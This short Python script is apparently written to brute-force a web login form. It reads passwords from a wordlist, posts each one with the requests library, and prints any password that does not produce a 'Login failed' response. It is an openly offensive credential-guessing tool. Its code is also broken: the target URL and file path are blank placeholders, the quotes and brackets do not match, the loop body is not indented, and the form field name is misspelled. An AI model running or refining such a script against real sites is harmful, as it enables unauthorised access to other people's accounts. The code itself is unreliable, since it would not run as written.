#!/usr/bin/env python

import requests 

target_url = 
data_dict = {"username": "blah" , "password : "", Login : "submit")


with open(place for password lists, "r") as wordlist_file:
	for line in wordlist_file:
	word = line.strip()
	data_dict["passwrd"] = word
	response = requests.post(target_url,data=data_dict)
	if "Login failed" not in str(response.content):
		print("Password is ->" + word")
		exit()

print(" Reached end of line")